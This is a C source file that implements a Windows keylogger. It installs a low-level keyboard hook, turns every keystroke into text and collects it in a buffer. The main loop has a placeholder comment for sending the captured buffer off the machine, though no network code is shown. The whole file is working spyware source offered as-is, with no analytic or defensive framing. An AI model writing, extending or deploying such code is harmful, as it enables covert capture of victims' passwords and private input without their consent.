#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "sock.h"
#include "error.h"

char *buffer;                       // keylogger buffer (time dependent)
unsigned int bufferIndex = 0;       // actual position on buffer (time dependent)
unsigned int bufferSize = BUFLEN;   // actual buffer size (time dependant)
HANDLE hMutex;
HHOOK hKeyHook;

void ConvertKey(unsigned int key, char *output) {
    BYTE keyboardState[256];
    WORD out;
    GetKeyboardState(keyboardState);
    int res = ToAsciiEx(
        key,
        MapVirtualKeyEx(
            key,
            0,
            GetKeyboardLayout(0)
        ),
        keyboardState,
        &out,
        0,
        GetKeyboardLayout(0)
    );

    if (res == 1) {
        output[0] = out & 0xff;
        output[1] = 0;
    } else if (res == 2) {
        output[0] = out & 0xff;
        output[1] = (out >> 8) & 0xff;
        output[2] = 0;
    }
}

void SaveKey(unsigned int key) {
    char keyStr[16];
    ConvertKey(key, keyStr);

    WaitForSingleObject(hMutex, INFINITE);

    int len = strlen(buffer);
    int available = bufferSize - len;

    if (strlen(keyStr) >= available) {
        bufferSize *= 2;
        buffer = realloc(buffer, bufferSize);
    }

    strcat(buffer, keyStr);

    ReleaseMutex(hMutex);
}

LRESULT CALLBACK RawInputKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
    }

    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
        SaveKey(keyboard->vkCode);
    }

    return CallNextHookEx(hKeyHook,  nCode, wParam, lParam);
}

DWORD WINAPI KeyLogger() {
    HINSTANCE hExe = GetModuleHandle(NULL);

    hKeyHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        (HOOKPROC) RawInputKeyboard,
        hExe,
        0
    );

    MSG msg;
    GetMessage(&msg, NULL, 0, 0);

    return 0;
}

int main(int argc, char **argv) {
    hMutex = CreateMutex(NULL, FALSE, NULL);

    buffer = (char *)malloc(BUFLEN);
    buffer[0] = 0;

    HANDLE logger;
    logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
    unsigned int timer = 0;
    int len;

    while (1) {
        if (timer % 10 == 0) {
            WaitForSingleObject(hMutex, INFINITE);
            len = strlen(buffer);
            timer = 0;
            ReleaseMutex(hMutex);
        }

        // send buffer somewhere from here

        // reset the buffer
        WaitForSingleObject(hMutex, INFINITE);
        strcpy(buffer, buffer + len);
        ReleaseMutex(hMutex);

        timer++;
        Sleep(1000); // 1 sec sleep
    }


    return 0;
} 